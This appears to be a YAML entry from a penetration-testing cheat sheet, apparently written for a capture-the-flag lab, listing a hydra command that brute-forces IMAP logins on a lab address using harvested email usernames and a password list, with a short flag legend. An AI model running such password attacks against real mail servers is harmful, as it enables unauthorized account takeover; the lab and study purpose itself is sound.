---
functions:
  gain-access:
    - description: hydra
      code: |
        hydra -vV -L found_email_usernames -P passwords.txt imap://10.10.10.197:143 -t 7
        
        -l --> username
        -L --> username list
        -p --> password
        -P --> password list
        -t --> threads
---
